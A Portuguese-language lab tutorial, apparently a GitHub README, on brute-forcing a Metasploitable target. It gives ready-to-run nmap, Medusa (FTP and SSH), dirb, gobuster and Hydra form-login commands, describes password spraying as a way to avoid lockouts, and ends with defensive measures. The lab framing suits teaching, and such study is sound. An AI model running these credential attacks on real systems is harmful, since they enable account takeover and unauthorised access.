# Ataques de força bruta

Ataque de força bruta é uma tecnica de ciberataque que usa tentativa e erro para descobrir senhas, chaves de criptografias ou credenciais de login tentando todas as combinações possiveis até encontrar a correta.
A eficiencia do ataque depende da complexidade da senha. 
Senhas muito complexas e muito grande se torna enviavel um ataque de força bruta.

Com isso, as melhores formas de se proteger contra ataques de força bruta é usar senhas fortes juntamente com um MFA. 

----------------------------------------------------------------------------------------------
### --ATENÇÃO--

`OS COMANDOS E TECNICAS APRESENTADOS AQUI SÃO REALIZADOS EM AMBIENTE CONTROLADO E VULNERAVEL PARA TESTES. QUALQUER TESTES REALIZADOS FORA DE UM CENARIO CONTROLADO É POR SUA CONTA E RISCO.`

----------------------------------------------------------------------------------------------

Usaremos  o sistema Metasploitable Para simular um ambiente em que faremos os ataques.

Simulando um ambiente real e vulnerável, suponhamos que de alguma forma através de alguma técnica descobrimos o IP do nosso alvo.

### SCANEANDO PORTAS E SERVIÇO USANDO O NMAP

Usaremos a ferramenta NMAP para reconhecer as portas e verificar os serviços rodando.

**INSTALAÇÃO**

`apt install nmap`

Usando o comando:

`nmap -sV [IP ALVO] > scan.txt`

Será feito o scan e o resultado salvo em um arquivo de texto com o nome scan.txt.

<img width="1513" height="760" alt="01 scannmap" src="https://github.com/user-attachments/assets/c357073c-7510-4f02-bd83-eedf36fbd097" />


Podemos verificar que ha vários serviços rodando e iremos realizar ataques em alguns deles como: ftp e ssh.


----


## INSTALANDO O MEDUSA

Caso não esteja usando o Kali linux ou alguma outra distribuição que já tenha o medusa, pode obter com o seguinte comando:

`sudo apt install medusa`

para sistema MAC use o comando:

`brew install medusa`


**BRUTE FORCE FPT USANDO A FERRAMENTA MEDUSA**

Usando uma wordlist de usuarios e uma wordlist de senhas faremos o ataque no serviço FTP com o comando:

`medusa -h [IP DO ALVO] -U [WORDLIST USUARIOS] -P [WORDLIST SENHAS] -M ftp -t[QTD THREADS]`

Nesse cenário fizemos um brute force no serviço de FTP usando wordlists de usuários e senhas e 6 threads.

<img width="1905" height="983" alt="02 bruteftp" src="https://github.com/user-attachments/assets/3c54ce00-1cf6-4119-ac9f-622270626a04" />


com o resultado de sucesso podemos testar e validar o acesso logando no serviço.

<img width="1131" height="982" alt="03 sectionftp" src="https://github.com/user-attachments/assets/55b1a0c4-709c-4deb-8237-a479c2c9d590" />


----

**ATAQUE DE LOGIN SSH COM MEDUSA**

Para o brute force  ssh podemos usar o comando:

`medusa -h [IP ALVO] -M ssh -U [WORDLIST USERS] -P [WORDLIST ] -t [QTD THREADS]`

<img width="1903" height="978" alt="04 brutessh" src="https://github.com/user-attachments/assets/7e052014-5d66-4428-a8ea-5923ae85152e" />


----

### ENUMERANDO DIRETORIOS

Para enumerar diretórios podemos usar qualquer ferramenta que automatize esse processo para termos mais agilidade.
usaremos o DIRB para enumerar mas tambem poderiamos usar o GOBUSTER

**INSTALANDO O DIRB**

`sudo apt install dirb`

**NSTALANDO O GOBUSTER**

`sudo apt install gobuster`

**ENUMERANDO DIRETÓRIOS COM O DIRB**

`dirb http://[IP DO ALVO]`

<img width="1021" height="714" alt="05 dirbscan" src="https://github.com/user-attachments/assets/2cf1f187-7d4f-4d8d-80e3-836459adbf73" />

**ENUMERANDO DIRETÓRIOS COM O GOBUSTER**

gobuster dir -u http://192.168.0.17 -w /usr/share/dirb/wordlists/common.txt

<img width="1422" height="738" alt="06 gobusterscan" src="https://github.com/user-attachments/assets/e99b1a2a-f30d-40ba-a2ca-50a374712fee" />

----

### ATAQUE DE LOGIN USANDO O HYDRA

Em nosso ambiente ha uma pagina de login via formulário e faremos um brute force usando o HYDRA.

**INSTALAÇÃO DO HYDRA**

`sudo apt install hydra`

para tal cenário usaremos o comando:

`hydra [IP ALVO] -L [WORDLIST USER] -P [WORDLIST PASS] http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`

<img width="1907" height="388" alt="image" src="https://github.com/user-attachments/assets/088b6f1d-6f75-42b2-bce3-d3d74646d473" />


Validando o retorno do ataque:

[foto login dvwa]


----

Uma outra técnica ao invés de usar várias senhas para um único usuário, é usar uma ou poucas senhas em vários usuários. Isso torna o ataque mais silencioso e discreto tornando mais difícil de causar alarmes no sistema fazendo com que o ataque seja bloqueado. Essa técnica é chamada de Password spraying.

Por isso é muito importante o uso de senhas fortes e MFA, implementação de criptografia na comunicação e sempre usar protocolos com camadas de segurança.
Bloquear a conta após um certo número de tentativas incorretas, monitoramento de IP e o uso de CAPTHA dificultam ataques ao sistema além de outras medidas de proteção como IDP/IPS. 
